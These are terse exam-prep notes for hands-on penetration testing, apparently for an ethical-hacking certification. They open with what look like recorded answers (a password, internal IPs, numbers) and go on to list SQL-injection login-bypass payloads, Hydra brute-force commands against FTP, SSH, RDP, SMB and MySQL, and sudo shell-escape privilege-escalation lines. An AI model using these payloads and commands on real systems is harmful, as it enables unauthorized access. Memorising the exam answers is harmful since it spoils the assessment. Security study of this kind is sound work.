Q-7
Secret123


Q-20 
ip ADDRESS 172.16.0.40

Q-4 
pass- test
4700056

Q-5 450989878899 

Q-12 F/N 201010988818

Q19 ANDERIOD
 IP 172.16.0.38

1876890


### Windows accounts find:
open the windows cmd
```
$ net user
```
### Host finder:
  Zenmap
 
### FTP Burteforce:
pass wordlist in the windows system. After the login FTP server

### Nmap Command:

$ nmap IP -sV -sC -p -O

### RDP Remote Desktop Connectiom

which IP remote machine service is running?
```
$ nmap IP -sV
```
## SQL Injection:
cookie based sql

### HTTP Vulnerability:
which http request has vulnerability?
```
$ use owaspzap  GET/POST
```
### Cryptography
```
cryptool
BCtextencoder
hash calc
veracrypt
```
### SQL payloads
```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—
```
### Hydra
```
    hydra -l root -P passwords.txt [-t 32] <IP> ftp
    hydra -L usernames.txt -P pass.txt <IP> mysql
    hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
    hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
    hydra -P common-snmp-community-strings.txt target.com snmp
    hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
    hydra -l root -P passwords.txt <IP> ssh
 ```
### Making custom wordlist from website keywords:
   $ cewl example.com -m 5 -w words.txt
   
   m= pass lenght
   w= output file
### wireshark
https://unit42.paloaltonetworks.com/using-wireshark-display-filter-expressions/

### Root privilege Escln
  ```
  $ sudo man man
  $ !/bin/bash
  $ sudo awk 'BEGIN {system("/bin/bash")}'
```
